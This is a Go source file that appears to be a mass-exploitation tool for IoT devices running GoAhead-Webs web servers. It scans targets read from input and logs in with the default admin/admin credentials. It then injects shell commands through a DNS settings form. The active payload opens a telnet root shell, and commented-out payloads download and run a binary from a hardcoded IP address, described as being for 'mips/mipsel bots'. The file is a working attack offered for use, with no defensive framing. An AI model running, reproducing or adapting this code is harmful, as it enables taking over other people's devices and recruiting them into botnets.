package main

import (
	"net"
	"os"
	"time"
	"fmt"
	"strings"
	"sync"
	"bufio"
	"io"
	"bytes"
	"strconv"
)

var (
	port = os.Args[1]

	wg sync.WaitGroup

	timeout = 10 * time.Second

	processed uint64
	found uint64
	exploited uint64

	//cd /tmp; rm -rf AQUIJE3q2; /bin/busybox ftpget IP -P 8021 AQUIJE3q2 AQUIJE3q2; chmod 777 AQUIJE3q2;./AQUIJE3q2 blink

	//payload = "cd%20%2Ftmp%3B%20rm%20-rf%20brrrr%3B%20%2Fbin%2Fbusybox%20ftpget%20143.42.11.97%20-P%208021%20brrrr%20brrrr%3B%20sh%20brrrr"
	payload = "%2Fbin%2Fbusybox%20telnetd%20-p7000%20-l%20%2Fbin%2Fsh%3B%20telnetd%20-p7000%20-l%20%2Fbin%2Fsh"
) // this is telnetd payload use your wget URL-Encoded payload (mips/mipsel bots)

func findDevice(target string) bool {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		fmt.Printf("%s\n", err)
		return false
	}

	defer conn.Close()

	conn.Write([]byte("GET / HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Hello World\r\n\r\n"))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	fmt.Printf("%s\n", buff.String())

	return strings.Contains(buff.String(), "Server: GoAhead-Webs")
}

func sendPayload(target, data string) bool {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return false
	}

	defer conn.Close()

	payloadData := "status=1&dns1=;" + data + ";&dns2=1.1.1.1"
	cntLen := strconv.Itoa(len(payloadData))

	conn.Write([]byte("POST /goform/set_AdvDns_cfg HTTP/1.1\r\nContent-Length: " + cntLen + "\r\nCookie: platform=0; user=admin\r\nReferer: http://" + target + "/admin/more.html\r\nHost: " + target + "\r\nUser-Agent: Hello World\r\n\r\n" + payloadData))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	return strings.Contains(buff.String(), "setdnsinfo")
}

func loginDevice(target string) bool {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return false
	}

	defer conn.Close()

	data := "platform=0&user=admin&pass=admin"
	cntLen := strconv.Itoa(len(data))

	conn.Write([]byte("POST /login/auth HTTP/1.1\r\nContent-Length: " + cntLen + "\r\nCookie: platform=0; user=admin\r\nReferer: http://" + target + "/login.asp\r\nHost: " + target + "\r\nUser-Agent: Hello World\r\n\r\n" + data))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	return strings.Contains(buff.String(), "/admin/main.html")
}

func exploitDevice(target string) {

	processed++

	wg.Add(1)
	defer wg.Done()

	if !findDevice(target) {
		return
	}

	found++

	if !loginDevice(target) {
		return
	}

	fmt.Printf("[BLINK] %s logged in\n", target)

	if !sendPayload(target, payload) {
		return
	}

	fmt.Printf("[BLINK] %s sent payload\n", target)

	if !sendPayload(target, "1.1.1.1") {
		return
	}

	fmt.Printf("[BLINK] %s reset payload\n", target)
}

func titleWriter() {
	for {
		fmt.Printf("Processed: %d | Found: %d | Exploited: %d\n", processed, found, exploited)
		time.Sleep(1 * time.Second)
	}
}

func main() {

	scanner := bufio.NewScanner(os.Stdin)

	go titleWriter()

	for scanner.Scan() {

		if port == "manual" {
			go exploitDevice(scanner.Text())
		} else {
			go exploitDevice(scanner.Text() + ":" + port)
		}
	}

	time.Sleep(10 * time.Second)
	wg.Wait()
}
